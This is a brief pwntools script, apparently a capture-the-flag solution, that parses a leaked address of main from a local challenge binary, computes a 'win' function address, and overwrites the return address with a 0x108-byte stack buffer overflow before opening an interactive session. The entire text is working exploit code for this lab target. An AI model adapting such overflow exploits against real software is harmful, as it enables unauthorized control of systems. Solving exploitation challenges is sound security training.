from pwn import *

p = process("./dist/challenge")

p.recvuntil(b"3.14159")
main_addr = int(p.recvuntil(b".\n", drop=True))
win_addr = main_addr - 104

p.sendline(b"A"*0x108 + p64(win_addr))

p.interactive()
